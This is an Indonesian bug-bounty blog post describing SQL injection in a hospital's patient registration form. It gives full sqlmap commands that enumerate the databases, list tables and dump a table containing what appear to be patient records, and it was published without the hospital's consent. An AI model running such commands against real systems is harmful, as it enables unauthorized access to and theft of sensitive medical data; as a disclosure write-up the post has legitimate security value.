---
title: "P1 SQL Injection Form Pendaftaran Rumah Sakit"
date: 2023-12-28T13:39:57+07:00
draft: false
tags:
- bugbounty
---
Saat akan daftar disalah satu rumah sakit tiba tiba kepikiran bisa gak sih form iin di inject?
# POC
1. Buka form pendaftaran, isikan dengan random data

![Form login](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/1.png)

2. Intercept post data dengan OWASP ZAP

![POST data](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/2.png)

3.  Setelah itu coba dengan sqlmap 
```
sqlmap -u https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --dbs --threads 2
```

![Database name](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/3.png)

4. Lihat isi table invoice
```
sqlmap -u "https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database --tables
```


![Table](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/4.png)

5. Dump table 
```
 sqlmap -u "https://redacted.com/index.php/CProsesDaftar/getpasien" --data="nomrm=Halo&tgllahir=2025-05-07&nik=9827982798279827&search=nomrm&tglperiksa=2023-12-07" --level 5 --risk 3 --banner --ignore-code 401 --technique=B --flush --threads 2 -D redacted-database  -T redacted-table --dump
```

6. Hasil dump adalah file .csv yang jika dibuka akan menampilkan informasi dibawah ini

![Hasil](https://raw.githubusercontent.com/bembenk18/Images/main/SQLI-Rumah_Sakit/5.png)


# Timeline Bug Report
- Report bug ke admin: 9 Desember 2023
- Respons: Sampai tulisan ini terbit belum ada respons dari pihak terkait (tulisan ini saya terbitkan tanpa persetujuan pihak terkait, jika ada keberatan dari pihak terkait maka akan saya takedown)
- Bug status: Fixed
- Rewards: -